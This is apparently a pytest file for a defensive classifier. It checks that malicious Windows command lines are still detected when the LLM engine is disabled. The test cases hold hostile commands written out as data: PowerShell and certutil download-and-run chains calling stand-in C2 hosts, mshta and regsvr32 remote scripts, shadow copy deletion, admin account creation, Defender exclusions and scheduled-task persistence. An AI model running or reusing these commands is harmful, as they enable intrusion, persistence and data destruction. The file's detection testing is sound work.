"""AI-OFF resilience test — verifies the ensemble classifier still
produces accurate output when the LLM engine abstains completely.

Simulates the "no OpenAI/Claude/Gemini key" scenario by monkey-patching
`_classify_llm` to always return confidence 0.
"""
from __future__ import annotations
import asyncio
import pytest


TEST_CASES = [
    # (name, input, expected_kind)
    ("multi-stage chain (10 lines)",
     "powershell -nop -w hidden -c \"IEX(iwr http://x/a.ps1)\"\n"
     "certutil -urlcache -f http://c2/x.txt x.txt\n"
     "certutil -decode x.txt x.exe\n"
     "rundll32 x.dll,Entry\n"
     "regsvr32 /s /i:http://c2/y.sct scrobj.dll\n"
     "mshta.exe http://c2/z.hta\n"
     "bitsadmin /transfer j http://c2/f.exe C:\\f.exe\n"
     "schtasks /create /sc onlogon /tn Health /tr C:\\f.exe",
     "multi_line_chain"),

    ("encoded PS -enc single-line",
     "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==",
     "encoded"),

    ("plaintext malicious PS",
     "Get-EventLog -LogName Security -Newest 100 | Where-Object {$_.EventID -eq 4625}",
     "plaintext_malicious"),

    ("certutil download + decode",
     "certutil.exe -urlcache -f https://c2.example/m.txt m.txt & certutil.exe -decode m.txt m.exe",
     "encoded"),

    ("ROT13 obfuscated",
     "cbjreFuryy.rkr -Abc -j uvqqra -p vrk(vje uggc://p8.rknzcyr/z.cf1)",
     "unclear_cipher"),

    ("wmic shadowcopy delete (ransom precursor)",
     "wmic shadowcopy delete",
     "plaintext_malicious"),

    ("net user creation",
     "net user Support Pass!2026 /add & net localgroup Administrators Support /add",
     "plaintext_malicious"),

    ("Add-MpPreference exclusion",
     "Add-MpPreference -ExclusionPath 'C:\\Temp\\evil.exe'",
     "plaintext_malicious"),

    ("bcdedit disable recovery",
     "bcdedit /set {default} recoveryenabled No",
     "plaintext_malicious"),

    ("nested certutil + wmic + schtasks",
     "certutil -urlcache -f https://c2.example/f.exe f.exe\n"
     "wmic /node:10.0.0.5 process call create \"f.exe\"\n"
     "schtasks /create /sc onlogon /tn Health /tr f.exe",
     "multi_line_chain"),
]


@pytest.mark.asyncio
async def test_ensemble_without_llm():
    """With LLM disabled, deterministic + regex + persona must still
    produce an accurate classification for every test case."""
    from routers import decode_guidance

    async def _llm_abstain(_text):
        return {"kind": "clean_text", "confidence": 0.0, "signals": [],
                "recommended": [], "guidance_steps": [], "_error": True}

    # Kill the LLM engine
    original = decode_guidance._classify_llm
    decode_guidance._classify_llm = _llm_abstain

    try:
        results = []
        for name, payload, expected in TEST_CASES:
            # Bypass FastAPI - call the router function directly
            det = decode_guidance._classify_deterministic(payload)
            hints = await decode_guidance._load_dynamic_patterns()
            persona = await decode_guidance._load_active_persona()
            dyn = decode_guidance._classify_dynamic_regex(payload, hints)
            per = decode_guidance._classify_persona(payload, persona)
            llm = await decode_guidance._classify_llm(payload)
            votes = {"deterministic": det, "dynamic-regex": dyn,
                     "persona": per, "llm": llm}
            ensemble = decode_guidance._ensemble_vote(votes, payload)

            # Loose match — encoded and plaintext_malicious can overlap
            kind_ok = (
                ensemble["kind"] == expected or
                (expected == "encoded" and ensemble["kind"] in
                    {"encoded", "multi_line_chain", "plaintext_malicious"}) or
                (expected == "plaintext_malicious" and ensemble["kind"] in
                    {"plaintext_malicious"})
            )
            results.append({"name": name, "expected": expected,
                            "got": ensemble["kind"], "ok": kind_ok,
                            "conf": ensemble["confidence"],
                            "rec": ensemble["recommended"]})
            print(f"{'✓' if kind_ok else '✗'} {name:45s}  "
                  f"expected={expected:22s} → got={ensemble['kind']:22s}  "
                  f"conf={ensemble['confidence']}  rec={ensemble['recommended'][:1]}")

        passed = sum(1 for r in results if r["ok"])
        assert passed >= 9, f"Only {passed}/10 kinds correct without LLM — degraded too much"
        print(f"\nAI-OFF resilience: {passed}/{len(results)} correct classifications")
    finally:
        decode_guidance._classify_llm = original
